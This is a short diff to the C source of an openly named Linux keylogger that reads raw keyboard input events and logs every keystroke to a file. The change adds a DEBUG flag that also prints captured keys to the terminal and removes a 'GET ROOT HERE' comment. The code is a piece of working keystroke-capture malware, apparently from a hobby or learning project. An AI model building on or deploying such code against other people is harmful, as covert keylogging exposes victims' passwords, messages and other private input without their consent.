@@ -27,7 +27,8 @@
 #include "keymap.h"
 #include "keyboard-finder.h"
 
-#define VERBOSE 1
+#define VERBOSE 1 // determines if keyboard_mapping prints things out
+#define DEBUG 0   // determines if logged keys are also printed to stdout
 
 int main() {
 
@@ -42,8 +43,6 @@ int main() {
 
     // Say hello
     printf("Welcome to the keylogger! Enjoy your stay.\n");
-
-    // GET ROOT HERE
 
     // create a new log file with read/write permissions
     logfile = fopen(LOGFILE_NAME, "w+");
@@ -71,6 +70,10 @@ int main() {
         while ( (rd = read(keyfd, &event, sizeof(struct input_event))) ) {
             if (event.type == EV_KEY) {
                 log_keystroke_humanformat(logfile, event);
+				if (DEBUG) {
+                	log_keystroke_humanformat(stdout, event);
+					printf("\n");
+				}
 			}
         }
     } else {
